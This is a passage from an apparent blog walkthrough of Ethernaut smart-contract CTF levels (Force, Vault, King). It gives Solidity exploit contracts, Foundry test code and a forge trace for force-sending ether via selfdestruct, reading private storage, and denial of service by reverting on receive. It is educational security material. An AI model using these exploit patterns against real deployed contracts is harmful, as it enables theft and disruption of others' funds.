<code>Force</code> contact on <code>selfdestruct</code>:</p>
<div class="highlight"><pre tabindex="0" style="background-color:#fff;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-solidity" data-lang="solidity"><span style="display:flex;"><span><span style="color:#728e00">contract</span> <span style="color:#434f54">ForceExploit</span> {
</span></span><span style="display:flex;"><span>    <span style="color:#434f54">Force</span> <span style="color:#728e00">private</span> <span style="color:#434f54">force</span>;
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>    <span style="color:#728e00">constructor</span>(<span style="color:#434f54">Force</span> <span style="color:#434f54">_force</span>) {
</span></span><span style="display:flex;"><span>        <span style="color:#434f54">force</span> <span style="color:#728e00">=</span> <span style="color:#434f54">_force</span>;
</span></span><span style="display:flex;"><span>    }
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>    <span style="color:#728e00">function</span> <span style="color:#d35400">run</span>() <span style="color:#728e00">public</span> <span style="color:#728e00">payable</span> {
</span></span><span style="display:flex;"><span>        <span style="color:#00979d">address</span> <span style="color:#728e00">payable</span> <span style="color:#434f54">target</span> <span style="color:#728e00">=</span> <span style="color:#728e00">payable</span>(<span style="color:#00979d">address</span>(<span style="color:#434f54">force</span>));
</span></span><span style="display:flex;"><span>        <span style="color:#728e00">selfdestruct</span>(<span style="color:#434f54">target</span>);
</span></span><span style="display:flex;"><span>    }
</span></span><span style="display:flex;"><span>}
</span></span></code></pre></div><p>Now let&rsquo;s call its <code>run</code> function funding it with just 1 wei.
This in turn will <code>selfdestruct</code> the <code>ForceExploit</code> and forward
the remaining funds to the <code>Force</code> contract.</p>
<div class="highlight"><pre tabindex="0" style="background-color:#fff;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-solidity" data-lang="solidity"><span style="display:flex;"><span><span style="color:#728e00">function</span> <span style="color:#d35400">exploit</span>() <span style="color:#728e00">internal</span> <span style="color:#728e00">override</span> {
</span></span><span style="display:flex;"><span>    <span style="color:#434f54">vm</span>.<span style="color:#434f54">startPrank</span>(<span style="color:#434f54">player</span>);
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>    <span style="color:#434f54">ForceExploit</span> <span style="color:#434f54">expl</span> <span style="color:#728e00">=</span> <span style="color:#728e00">new</span> <span style="color:#434f54">ForceExploit</span>(<span style="color:#434f54">level</span>);
</span></span><span style="display:flex;"><span>    <span style="color:#434f54">expl</span>.<span style="color:#434f54">run</span>{<span style="color:#728e00">value</span><span style="color:#728e00">:</span> <span style="color:#8a7b52">1</span> <span style="color:#00979d">wei</span>}();
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>    <span style="color:#434f54">vm</span>.<span style="color:#434f54">stopPrank</span>();
</span></span><span style="display:flex;"><span>}
</span></span></code></pre></div></li>
</ul>
  <!--list-separator-->
<ul>
<li>
<p>Conclusion</p>
<p>There are other ways to modify contract&rsquo;s balance besides your
public/external functions. Don&rsquo;t try to do your own bookkeeping.</p>
</li>
</ul>
  <!--list-separator-->
<ul>
<li>
<p>References</p>
<ul>
<li><a href="https://solidity-by-example.org/hacks/self-destruct/"  class="external-link" target="_blank" rel="noopener">Self
Destruct</a> from Solidity by Example.</li>
<li><a href="https://docs.soliditylang.org/en/latest/introduction-to-smart-contracts.html#deactivate-and-self-destruct"  class="external-link" target="_blank" rel="noopener">Deactivate
and Self-destruct</a> from Solidity docs.</li>
</ul>
<hr>
<p>Thanks for reading!
I&rsquo;ll leave the code for this level
<a href="https://github.com/vyorkin/ethernaut-solutions/blob/step-8/src/test/Force.t.sol"  class="external-link" target="_blank" rel="noopener">here</a>.</p>
<p>Now let&rsquo;s look at the <a href="https://vyorkin.org/posts/ctf-walkthrough-ethernaut-9-vault" >Ethernaut, #9 Vault</a>!</p>
</li>
</ul>
</li>
</ul>
<!--list-separator-->
<ul>
<li>
<p><span class="org-todo done DONE">DONE</span>  Ethernaut, #9 Vault</p>
<p>We need to unlock the <code>Vault</code> smart contract to pass the level.</p>
<div class="highlight"><pre tabindex="0" style="background-color:#fff;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-solidity" data-lang="solidity"><span style="display:flex;"><span><span style="color:#95a5a6">// SPDX-License-Identifier: MIT
</span></span></span><span style="display:flex;"><span><span style="color:#95a5a6"></span><span style="color:#728e00">pragma solidity</span> <span style="color:#728e00">^</span><span style="color:#8a7b52">0</span>.<span style="color:#8a7b52">8</span>.<span style="color:#8a7b52">2</span>;
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span><span style="color:#728e00">contract</span> <span style="color:#434f54">Vault</span> {
</span></span><span style="display:flex;"><span>    <span style="color:#00979d">bool</span> <span style="color:#728e00">public</span> <span style="color:#434f54">locked</span>;
</span></span><span style="display:flex;"><span>    <span style="color:#00979d">bytes32</span> <span style="color:#728e00">private</span> <span style="color:#434f54">password</span>;
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>    <span style="color:#728e00">constructor</span>(<span style="color:#00979d">bytes32</span> <span style="color:#434f54">_password</span>) <span style="color:#728e00">public</span> {
</span></span><span style="display:flex;"><span>        <span style="color:#434f54">locked</span> <span style="color:#728e00">=</span> <span style="color:#00979d">true</span>;
</span></span><span style="display:flex;"><span>        <span style="color:#434f54">password</span> <span style="color:#728e00">=</span> <span style="color:#434f54">_password</span>;
</span></span><span style="display:flex;"><span>    }
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>    <span style="color:#728e00">function</span> <span style="color:#d35400">unlock</span>(<span style="color:#00979d">bytes32</span> <span style="color:#434f54">_password</span>) <span style="color:#728e00">public</span> {
</span></span><span style="display:flex;"><span>        <span style="color:#728e00">if</span> (<span style="color:#434f54">password</span> <span style="color:#728e00">==</span> <span style="color:#434f54">_password</span>) {
</span></span><span style="display:flex;"><span>            <span style="color:#434f54">locked</span> <span style="color:#728e00">=</span> <span style="color:#00979d">false</span>;
</span></span><span style="display:flex;"><span>        }
</span></span><span style="display:flex;"><span>    }
</span></span><span style="display:flex;"><span>}
</span></span></code></pre></div>  <!--list-separator-->
<ul>
<li>
<p>Analysis</p>
<p>Let&rsquo;s look at the state variables:</p>
<div class="highlight"><pre tabindex="0" style="background-color:#fff;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-solidity" data-lang="solidity"><span style="display:flex;"><span><span style="color:#00979d">bool</span> <span style="color:#728e00">public</span> <span style="color:#434f54">locked</span>;
</span></span><span style="display:flex;"><span><span style="color:#00979d">bytes32</span> <span style="color:#728e00">private</span> <span style="color:#434f54">password</span>;
</span></span></code></pre></div><p>In EVM storage is a key-value store that maps 256-bit words to 256-bit
words and is accessed with EVM’s <code>SSTORE~/~SLOAD</code> instructions.</p>
<p>The <code>private</code> visibility modifier means that other contracts
can&rsquo;t read the <code>password</code> state variable directly. But all
storage variables of any contract are visible to anyone because
everything on a blockchain is public.</p>
</li>
</ul>
  <!--list-separator-->
<ul>
<li>
<p>Exploit</p>
<p>In the <code>foundry</code> we use
<a href="https://book.getfoundry.sh/cheatcodes/load"  class="external-link" target="_blank" rel="noopener">wm.load</a> to load
the password value from the storage slot. The <code>bytes32</code> takes
the whole slot, hence we want to access the slot with index <code>1</code>.
Then we just <code>unlock</code> the <code>Vault</code> with that password:</p>
<div class="highlight"><pre tabindex="0" style="background-color:#fff;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-solidity" data-lang="solidity"><span style="display:flex;"><span><span style="color:#728e00">function</span> <span style="color:#d35400">exploit</span>() <span style="color:#728e00">internal</span> <span style="color:#728e00">override</span> {
</span></span><span style="display:flex;"><span>    <span style="color:#434f54">vm</span>.<span style="color:#434f54">startPrank</span>(<span style="color:#434f54">player</span>);
</span></span><span style="display:flex;"><span>    <span style="color:#00979d">bytes32</span> <span style="color:#434f54">password</span> <span style="color:#728e00">=</span> <span style="color:#434f54">vm</span>.<span style="color:#434f54">load</span>(<span style="color:#00979d">address</span>(<span style="color:#434f54">level</span>), <span style="color:#00979d">bytes32</span>(<span style="color:#00979d">uint256</span>(<span style="color:#8a7b52">1</span>)));
</span></span><span style="display:flex;"><span>    <span style="color:#434f54">level</span>.<span style="color:#434f54">unlock</span>(<span style="color:#434f54">password</span>);
</span></span><span style="display:flex;"><span>    <span style="color:#434f54">vm</span>.<span style="color:#434f54">stopPrank</span>();
</span></span><span style="display:flex;"><span>}
</span></span></code></pre></div></li>
</ul>
  <!--list-separator-->
<ul>
<li>
<p>Summary</p>
<p>Do not store any sensitive info &ldquo;as is&rdquo; a smart contract&rsquo;s
storage. Anyone can read contract state and incorrect
assumptions about privacy aspects of data or transactions can be
abused which may lead to security issues.</p>
</li>
</ul>
  <!--list-separator-->
<ul>
<li>
<p>References</p>
<ul>
<li><a href="https://docs.soliditylang.org/en/latest/internals/layout_in_storage.html"  class="external-link" target="_blank" rel="noopener">Layout
of State Variables in Storage</a></li>
<li><a href="https://swcregistry.io/docs/SWC-136"  class="external-link" target="_blank" rel="noopener">SWC-136</a> from the Smart Contract Weakness Classification
and Test Cases.</li>
</ul>
<hr>
<p>The full code
<a href="https://github.com/vyorkin/ethernaut-solutions/blob/step-9/src/test/Vault.t.sol"  class="external-link" target="_blank" rel="noopener">is
here</a>. Thank you for reading and let&rsquo;s move on to the next
challenge: <a href="https://vyorkin.org/posts/ctf-walkthrough-ethernaut-10-king" >Ethernaut, #10 King</a>!</p>
</li>
</ul>
</li>
</ul>
<!--list-separator-->
<ul>
<li>
<p><span class="org-todo done DONE">DONE</span>  Ethernaut, #10 King</p>
<p>The goal of this level is to break the game defined by the
<code>King</code> contract.</p>
<div class="highlight"><pre tabindex="0" style="background-color:#fff;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-solidity" data-lang="solidity"><span style="display:flex;"><span><span style="color:#95a5a6">// SPDX-License-Identifier: MIT
</span></span></span><span style="display:flex;"><span><span style="color:#95a5a6"></span><span style="color:#728e00">pragma solidity</span> <span style="color:#728e00">^</span><span style="color:#8a7b52">0</span>.<span style="color:#8a7b52">8</span>.<span style="color:#8a7b52">2</span>;
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span><span style="color:#728e00">contract</span> <span style="color:#434f54">King</span> {
</span></span><span style="display:flex;"><span>    <span style="color:#00979d">address</span> <span style="color:#728e00">payable</span> <span style="color:#434f54">king</span>;
</span></span><span style="display:flex;"><span>    <span style="color:#00979d">address</span> <span style="color:#728e00">payable</span> <span style="color:#728e00">public</span> <span style="color:#434f54">owner</span>;
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>    <span style="color:#00979d">uint256</span> <span style="color:#728e00">public</span> <span style="color:#434f54">prize</span>;
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>    <span style="color:#728e00">constructor</span>() <span style="color:#728e00">payable</span> {
</span></span><span style="display:flex;"><span>        <span style="color:#434f54">owner</span> <span style="color:#728e00">=</span> <span style="color:#728e00">payable</span>(<span style="color:#728e00">msg</span>.<span style="color:#728e00">sender</span>);
</span></span><span style="display:flex;"><span>        <span style="color:#434f54">king</span> <span style="color:#728e00">=</span> <span style="color:#728e00">payable</span>(<span style="color:#728e00">msg</span>.<span style="color:#728e00">sender</span>);
</span></span><span style="display:flex;"><span>        <span style="color:#434f54">prize</span> <span style="color:#728e00">=</span> <span style="color:#728e00">msg</span>.<span style="color:#728e00">value</span>;
</span></span><span style="display:flex;"><span>    }
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>    <span style="color:#434f54">receive</span>() <span style="color:#728e00">external</span> <span style="color:#728e00">payable</span> {
</span></span><span style="display:flex;"><span>        <span style="color:#728e00">require</span>(<span style="color:#728e00">msg</span>.<span style="color:#728e00">value</span> <span style="color:#728e00">&gt;=</span> <span style="color:#434f54">prize</span> <span style="color:#728e00">||</span> <span style="color:#728e00">msg</span>.<span style="color:#728e00">sender</span> <span style="color:#728e00">==</span> <span style="color:#434f54">owner</span>);
</span></span><span style="display:flex;"><span>        <span style="color:#434f54">king</span>.<span style="color:#728e00">transfer</span>(<span style="color:#728e00">msg</span>.<span style="color:#728e00">value</span>);
</span></span><span style="display:flex;"><span>        <span style="color:#434f54">king</span> <span style="color:#728e00">=</span> <span style="color:#728e00">payable</span>(<span style="color:#728e00">msg</span>.<span style="color:#728e00">sender</span>);
</span></span><span style="display:flex;"><span>        <span style="color:#434f54">prize</span> <span style="color:#728e00">=</span> <span style="color:#728e00">msg</span>.<span style="color:#728e00">value</span>;
</span></span><span style="display:flex;"><span>    }
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>    <span style="color:#728e00">function</span> <span style="color:#d35400">_king</span>() <span style="color:#728e00">public</span> <span style="color:#728e00">view</span> <span style="color:#728e00">returns</span> (<span style="color:#00979d">address</span> <span style="color:#728e00">payable</span>) {
</span></span><span style="display:flex;"><span>        <span style="color:#728e00">return</span> <span style="color:#434f54">king</span>;
</span></span><span style="display:flex;"><span>    }
</span></span><span style="display:flex;"><span>}
</span></span></code></pre></div><p>Here is how the game checks if we passed:</p>
<div class="highlight"><pre tabindex="0" style="background-color:#fff;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-solidity" data-lang="solidity"><span style="display:flex;"><span><span style="color:#00979d">address</span>(<span style="color:#434f54">instance</span>).<span style="color:#728e00">call</span>{<span style="color:#728e00">value</span><span style="color:#728e00">:</span> <span style="color:#8a7b52">0</span>}(<span style="color:#7f8c8d">&#34;&#34;</span>);
</span></span><span style="display:flex;"><span><span style="color:#728e00">return</span> <span style="color:#434f54">instance</span>.<span style="color:#434f54">_king</span>() <span style="color:#728e00">!=</span> <span style="color:#00979d">address</span>(<span style="color:#728e00">this</span>);
</span></span></code></pre></div><p>It tries to reclaim the kingship, hence &ldquo;to break the game&rdquo;
means that we must prevent it from restoring the kingship.</p>
  <!--list-separator-->
<ul>
<li>
<p>Analysis</p>
<p>There are 3 state variables in the <code>King</code> contact:</p>
<div class="highlight"><pre tabindex="0" style="background-color:#fff;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-solidity" data-lang="solidity"><span style="display:flex;"><span><span style="color:#00979d">address</span> <span style="color:#728e00">payable</span> <span style="color:#434f54">king</span>;
</span></span><span style="display:flex;"><span><span style="color:#00979d">address</span> <span style="color:#728e00">payable</span> <span style="color:#728e00">public</span> <span style="color:#434f54">owner</span>;
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span><span style="color:#00979d">uint256</span> <span style="color:#728e00">public</span> <span style="color:#434f54">prize</span>;
</span></span></code></pre></div><p>We start with the <code>king</code> and the <code>owner</code> set to a deployer of
the <code>King</code> contract, which is the <code>levelFactory</code> &ndash; contract
responsible for setting up the level and checking the winning
conditions.</p>
<div class="highlight"><pre tabindex="0" style="background-color:#fff;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-solidity" data-lang="solidity"><span style="display:flex;"><span><span style="color:#728e00">constructor</span>() <span style="color:#728e00">payable</span> {
</span></span><span style="display:flex;"><span>    <span style="color:#434f54">owner</span> <span style="color:#728e00">=</span> <span style="color:#728e00">payable</span>(<span style="color:#728e00">msg</span>.<span style="color:#728e00">sender</span>);
</span></span><span style="display:flex;"><span>    <span style="color:#434f54">king</span> <span style="color:#728e00">=</span> <span style="color:#728e00">payable</span>(<span style="color:#728e00">msg</span>.<span style="color:#728e00">sender</span>);
</span></span><span style="display:flex;"><span>    <span style="color:#434f54">prize</span> <span style="color:#728e00">=</span> <span style="color:#728e00">msg</span>.<span style="color:#728e00">value</span>;
</span></span><span style="display:flex;"><span>}
</span></span></code></pre></div><p>So this is our initial state:</p>
<div class="highlight"><pre tabindex="0" style="background-color:#fff;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-solidity" data-lang="solidity"><span style="display:flex;"><span><span style="color:#434f54">assertEq</span>(<span style="color:#434f54">level</span>.<span style="color:#434f54">_king</span>(), <span style="color:#00979d">address</span>(<span style="color:#434f54">levelFactory</span>));
</span></span><span style="display:flex;"><span><span style="color:#434f54">assertEq</span>(<span style="color:#434f54">level</span>.<span style="color:#434f54">prize</span>(), <span style="color:#8a7b52">0</span>);
</span></span></code></pre></div><p>Now, let&rsquo;s have a look at the <code>receive</code> function:</p>
<div class="highlight"><pre tabindex="0" style="background-color:#fff;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-solidity" data-lang="solidity"><span style="display:flex;"><span> <span style="color:#434f54">receive</span>() <span style="color:#728e00">external</span> <span style="color:#728e00">payable</span> {
</span></span><span style="display:flex;"><span>    <span style="color:#728e00">require</span>(<span style="color:#728e00">msg</span>.<span style="color:#728e00">value</span> <span style="color:#728e00">&gt;=</span> <span style="color:#434f54">prize</span> <span style="color:#728e00">||</span> <span style="color:#728e00">msg</span>.<span style="color:#728e00">sender</span> <span style="color:#728e00">==</span> <span style="color:#434f54">owner</span>);
</span></span><span style="display:flex;"><span>    <span style="color:#434f54">king</span>.<span style="color:#728e00">transfer</span>(<span style="color:#728e00">msg</span>.<span style="color:#728e00">value</span>);
</span></span><span style="display:flex;"><span>    <span style="color:#434f54">king</span> <span style="color:#728e00">=</span> <span style="color:#728e00">payable</span>(<span style="color:#728e00">msg</span>.<span style="color:#728e00">sender</span>);
</span></span><span style="display:flex;"><span>    <span style="color:#434f54">prize</span> <span style="color:#728e00">=</span> <span style="color:#728e00">msg</span>.<span style="color:#728e00">value</span>;
</span></span><span style="display:flex;"><span>}
</span></span></code></pre></div><p>To become a new king we need to send the same or more ETH than
the current <code>prize</code>. Then the contract will <code>transfer</code> the
current prize to the previous king, set our address as the new
king, and update the <code>prize</code> state variable with the amount of
ETH we sent.</p>
<p>The problem is an assumption that the <code>king.transfer(msg.value)</code>
call will succeed. Imagine that the <code>transfer</code> always fails,
then no one can ever become a new king.</p>
</li>
</ul>
  <!--list-separator-->
<ul>
<li>
<p>Solution</p>
<p>We&rsquo;ll need another contract for exploit. There are 2 ways to
implement it so that it breaks the transfer logic.</p>
<ol>
<li>Define neither <code>fallback</code> nor <code>receive</code> function.</li>
<li>Implement one of these functions, but immediately revert.</li>
</ol>
<p>For example, let&rsquo;s try #2:</p>
<div class="highlight"><pre tabindex="0" style="background-color:#fff;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-solidity" data-lang="solidity"><span style="display:flex;"><span> <span style="color:#728e00">contract</span> <span style="color:#434f54">KingExploit</span> {
</span></span><span style="display:flex;"><span>    <span style="color:#00979d">address</span> <span style="color:#728e00">payable</span> <span style="color:#434f54">level</span>;
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>    <span style="color:#728e00">constructor</span>(<span style="color:#434f54">King</span> <span style="color:#434f54">_king</span>) {
</span></span><span style="display:flex;"><span>        <span style="color:#434f54">level</span> <span style="color:#728e00">=</span> <span style="color:#728e00">payable</span>(<span style="color:#00979d">address</span>(<span style="color:#434f54">_king</span>));
</span></span><span style="display:flex;"><span>    }
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>    <span style="color:#728e00">function</span> <span style="color:#d35400">run</span>() <span style="color:#728e00">public</span> <span style="color:#728e00">payable</span> {
</span></span><span style="display:flex;"><span>        (<span style="color:#00979d">bool</span> <span style="color:#434f54">success</span>,) <span style="color:#728e00">=</span> <span style="color:#434f54">level</span>.<span style="color:#728e00">call</span>{<span style="color:#728e00">value</span><span style="color:#728e00">:</span> <span style="color:#728e00">msg</span>.<span style="color:#728e00">value</span>}(<span style="color:#7f8c8d">&#34;&#34;</span>);
</span></span><span style="display:flex;"><span>        <span style="color:#728e00">require</span>(<span style="color:#434f54">success</span>, <span style="color:#7f8c8d">&#34;failed to send ether&#34;</span>);
</span></span><span style="display:flex;"><span>    }
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>    <span style="color:#434f54">receive</span>() <span style="color:#728e00">external</span> <span style="color:#728e00">payable</span> {
</span></span><span style="display:flex;"><span>        <span style="color:#728e00">revert</span>(<span style="color:#7f8c8d">&#34;muhahaha&#34;</span>);
</span></span><span style="display:flex;"><span>    }
</span></span><span style="display:flex;"><span>}
</span></span></code></pre></div><p>Now, let&rsquo;s make it a king:</p>
<div class="highlight"><pre tabindex="0" style="background-color:#fff;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-solidity" data-lang="solidity"><span style="display:flex;"><span><span style="color:#728e00">function</span> <span style="color:#d35400">exploit</span>() <span style="color:#728e00">internal</span> <span style="color:#728e00">override</span> {
</span></span><span style="display:flex;"><span>    <span style="color:#434f54">vm</span>.<span style="color:#434f54">startPrank</span>(<span style="color:#434f54">player</span>);
</span></span><span style="display:flex;"><span>    <span style="color:#434f54">KingExploit</span> <span style="color:#434f54">expl</span> <span style="color:#728e00">=</span> <span style="color:#728e00">new</span> <span style="color:#434f54">KingExploit</span>(<span style="color:#434f54">level</span>);
</span></span><span style="display:flex;"><span>    <span style="color:#434f54">expl</span>.<span style="color:#434f54">run</span>{<span style="color:#728e00">value</span><span style="color:#728e00">:</span> <span style="color:#8a7b52">1</span> <span style="color:#00979d">wei</span>}();
</span></span><span style="display:flex;"><span>    <span style="color:#434f54">vm</span>.<span style="color:#434f54">stopPrank</span>();
</span></span><span style="display:flex;"><span>}
</span></span></code></pre></div><p>This is it! The trace:</p>
<div class="highlight"><pre tabindex="0" style="background-color:#fff;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-sh" data-lang="sh"><span style="display:flex;"><span>$ forge <span style="color:#728e00">test</span> --match-contract KingTest -vvvv
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>Running <span style="color:#8a7b52">1</span> <span style="color:#728e00">test</span> <span style="color:#728e00">for</span> src/test/King.t.sol:KingTest
</span></span><span style="display:flex;"><span><span style="color:#728e00">[</span>PASS<span style="color:#728e00">]</span> testKing<span style="color:#728e00">()</span> <span style="color:#728e00">(</span>gas: 431179<span style="color:#728e00">)</span>
</span></span><span style="display:flex;"><span>Traces:
</span></span><span style="display:flex;"><span>  <span style="color:#728e00">[</span>431179<span style="color:#728e00">]</span> KingTest::testKing<span style="color:#728e00">()</span>
</span></span><span style="display:flex;"><span>    ├─ <span style="color:#728e00">[</span>215833<span style="color:#728e00">]</span> KingTest::create<span style="color:#728e00">()</span>
</span></span><span style="display:flex;"><span>    │   ├─ <span style="color:#728e00">[</span>0<span style="color:#728e00">]</span> VM::prank<span style="color:#728e00">(</span>player: <span style="color:#728e00">[</span>...<span style="color:#728e00">])</span>
</span></span><span style="display:flex;"><span>    │   │   └─ ← <span style="color:#728e00">()</span>
</span></span><span style="display:flex;"><span>    │   ├─ <span style="color:#728e00">[</span>203485<span style="color:#728e00">]</span> Ethernaut::createLevelInstance<span style="color:#728e00">(</span>KingFactory: <span style="color:#728e00">[</span>...<span style="color:#728e00">])</span>
</span></span><span style="display:flex;"><span>    │   │   ├─ <span style="color:#728e00">[</span>151922<span style="color:#728e00">]</span> KingFactory::createInstance<span style="color:#728e00">(</span>player: <span style="color:#728e00">[</span>...<span style="color:#728e00">])</span>
</span></span><span style="display:flex;"><span>    │   │   │   ├─ <span style="color:#728e00">[</span>119381<span style="color:#728e00">]</span> → new King@<span style="color:#7f8c8d">&#34;0x037f…dd8f&#34;</span>
</span></span><span style="display:flex;"><span>    │   │   │   │   └─ ← <span style="color:#8a7b52">364</span> bytes of code
</span></span><span style="display:flex;"><span>    │   │   │   └─ ← King: <span style="color:#728e00">[</span>...<span style="color:#728e00">]</span>
</span></span><span style="display:flex;"><span>    │   │   ├─ emit LevelInstanceCreatedLog<span style="color:#728e00">(</span>player: player: <span style="color:#728e00">[</span>...<span style="color:#728e00">]</span>, instance: King: <span style="color:#728e00">[</span>...<span style="color:#728e00">])</span>
</span></span><span style="display:flex;"><span>    │   │   └─ ← King: <span style="color:#728e00">[</span>...<span style="color:#728e00">]</span>
</span></span><span style="display:flex;"><span>    │   └─ ← King: <span style="color:#728e00">[</span>...<span style="color:#728e00">]</span>
</span></span><span style="display:flex;"><span>    ├─ <span style="color:#728e00">[</span>287<span style="color:#728e00">]</span> King::_king<span style="color:#728e00">()</span> <span style="color:#728e00">[</span>staticcall<span style="color:#728e00">]</span>
</span></span><span style="display:flex;"><span>    │   └─ ← KingFactory: <span style="color:#728e00">[</span>...<span style="color:#728e00">]</span>
</span></span><span style="display:flex;"><span>    ├─ <span style="color:#728e00">[</span>317<span style="color:#728e00">]</span> King::prize<span style="color:#728e00">()</span> <span style="color:#728e00">[</span>staticcall<span style="color:#728e00">]</span>
</span></span><span style="display:flex;"><span>    │   └─ ← <span style="color:#8a7b52">0</span>
</span></span><span style="display:flex;"><span>    ├─ <span style="color:#728e00">[</span>0<span style="color:#728e00">]</span> VM::startPrank<span style="color:#728e00">(</span>player: <span style="color:#728e00">[</span>...<span style="color:#728e00">])</span>
</span></span><span style="display:flex;"><span>    │   └─ ← <span style="color:#728e00">()</span>
</span></span><span style="display:flex;"><span>    ├─ <span style="color:#728e00">[</span>86666<span style="color:#728e00">]</span> → new KingExploit@<span style="color:#7f8c8d">&#34;0xa2f9…f3a7&#34;</span>
</span></span><span style="display:flex;"><span>    │   └─ ← <span style="color:#8a7b52">321</span> bytes of code
</span></span><span style="display:flex;"><span>    ├─ <span style="color:#728e00">[</span>34652<span style="color:#728e00">]</span> KingExploit::run<span style="color:#728e00">{</span>value: 1<span style="color:#728e00">}()</span>
</span></span><span style="display:flex;"><span>    │   ├─ <span style="color:#728e00">[</span>27516<span style="color:#728e00">]</span> King::fallback<span style="color:#728e00">{</span>value: 1<span style="color:#728e00">}()</span>
</span></span><span style="display:flex;"><span>    │   │   ├─ <span style="color:#728e00">[</span>55<span style="color:#728e00">]</span> KingFactory::fallback<span style="color:#728e00">{</span>value: 1<span style="color:#728e00">}()</span>
</span></span><span style="display:flex;"><span>    │   │   │   └─ ← <span style="color:#728e00">()</span>
</span></span><span style="display:flex;"><span>    │   │   └─ ← <span style="color:#728e00">()</span>
</span></span><span style="display:flex;"><span>    │   └─ ← <span style="color:#728e00">()</span>
</span></span><span style="display:flex;"><span>    ├─ <span style="color:#728e00">[</span>0<span style="color:#728e00">]</span> VM::stopPrank<span style="color:#728e00">()</span>
</span></span><span style="display:flex;"><span>    │   └─ ← <span style="color:#728e00">()</span>
</span></span><span style="display:flex;"><span>    ├─ <span style="color:#728e00">[</span>0<span style="color:#728e00">]</span> VM::startPrank<span style="color:#728e00">(</span>player: <span style="color:#728e00">[</span>...<span style="color:#728e00">])</span>
</span></span><span style="display:flex;"><span>    │   └─ ← <span style="color:#728e00">()</span>
</span></span><span style="display:flex;"><span>    ├─ <span style="color:#728e00">[</span>5470<span style="color:#728e00">]</span> Ethernaut::submitLevelInstance<span style="color:#728e00">(</span>King: <span style="color:#728e00">[</span>...<span style="color:#728e00">])</span>
</span></span><span style="display:flex;"><span>    │   ├─ <span style="color:#728e00">[</span>2423<span style="color:#728e00">]</span> KingFactory::validateInstance<span style="color:#728e00">(</span>King: <span style="color:#728e00">[</span>...<span style="color:#728e00">]</span>, player: <span style="color:#728e00">[</span>...<span style="color:#728e00">])</span>
</span></span><span style="display:flex;"><span>    │   │   ├─ <span style="color:#728e00">[</span>838<span style="color:#728e00">]</span> King::fallback<span style="color:#728e00">()</span>
</span></span><span style="display:flex;"><span>    │   │   │   ├─ <span style="color:#728e00">[</span>167<span style="color:#728e00">]</span> KingExploit::fallback<span style="color:#728e00">()</span>
</span></span><span style="display:flex;"><span>    │   │   │   │   └─ ← <span style="color:#7f8c8d">&#34;muhahaha&#34;</span>
</span></span><span style="display:flex;"><span>    │   │   │   └─ ← <span style="color:#7f8c8d">&#34;muhahaha&#34;</span>
</span></span><span style="display:flex;"><span>    │   │   ├─ <span style="color:#728e00">[</span>287<span style="color:#728e00">]</span> King::_king<span style="color:#728e00">()</span> <span style="color:#728e00">[</span>staticcall<span style="color:#728e00">]</span>
</span></span><span style="display:flex;"><span>    │   │   │   └─ ← KingExploit: <span style="color:#728e00">[</span>...<span style="color:#728e00">]</span>
</span></span><span style="display:flex;"><span>    │   │   └─ ← <span style="color:#728e00">true</span>
</span></span><span style="display:flex;"><span>    │   ├─ emit LevelCompletedLog<span style="color:#728e00">(</span>player: player: <span style="color:#728e00">[</span>...<span style="color:#728e00">]</span>, level: KingFactory: <span style="color:#728e00">[</span>...<span style="color:#728e00">])</span>
</span></span><span style="display:flex;"><span>    │   └─ ← <span style="color:#728e00">true</span>
</span></span><span style="display:flex;"><span>    ├─ <span style="color:#728e00">[</span>0<span style="color:#728e00">]</span> VM::stopPrank<span style="color:#728e00">()</span>
</span></span><span style="display:flex;"><span>    │   └─ ← <span style="color:#728e00">()</span>
</span></span><span style="display:flex;"><span>    └─ ← <span style="color:#728e00">()</span>
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>Test result: ok. <span style="color:#8a7b52">1</span> passed; <span style="color:#8a7b52">0</span> failed; finished in 1.09ms
</span></span></code></pre></div><p>Let&rsquo;s try omitting the <code>receive</code> and <code>fallback</code> functions:</p>
<div class="highlight"><pre tabindex="0" style="background-color:#fff;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-solidity" data-lang="solidity"><span style="display:flex;"><span><span style="color:#728e00">contract</span> <span style="color:#434f54">KingExploit</span> {
</span></span><span style="display:flex;"><span>    <span style="color:#728e00">function</span> <span style="color:#d35400">run</span>(<span style="color:#00979d">address</span> <span style="color:#434f54">_king</span>) <span style="color:#728e00">public</span> <span style="color:#728e00">payable</span> {
